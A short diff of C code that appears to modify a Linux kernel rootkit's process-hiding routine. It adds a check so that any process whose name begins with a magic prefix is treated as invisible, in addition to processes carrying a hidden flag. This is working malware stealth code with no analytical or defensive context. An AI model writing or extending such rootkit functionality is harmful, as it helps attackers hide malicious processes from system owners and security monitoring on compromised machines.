@@ -96,6 +96,11 @@ find_task(pid_t pid)
 	return NULL;
 }
 
+int starts_with_prefix(const char *s)
+{
+	return !memcmp(MAGIC_PREFIX, s, strlen(MAGIC_PREFIX));
+}
+
 int
 is_invisible(pid_t pid)
 {
@@ -106,6 +111,8 @@ is_invisible(pid_t pid)
 	if (!task)
 		return 0;
 	if (task->flags & PF_INVISIBLE)
+		return 1;
+	if(starts_with_prefix(task->comm))
 		return 1;
 	return 0;
 }
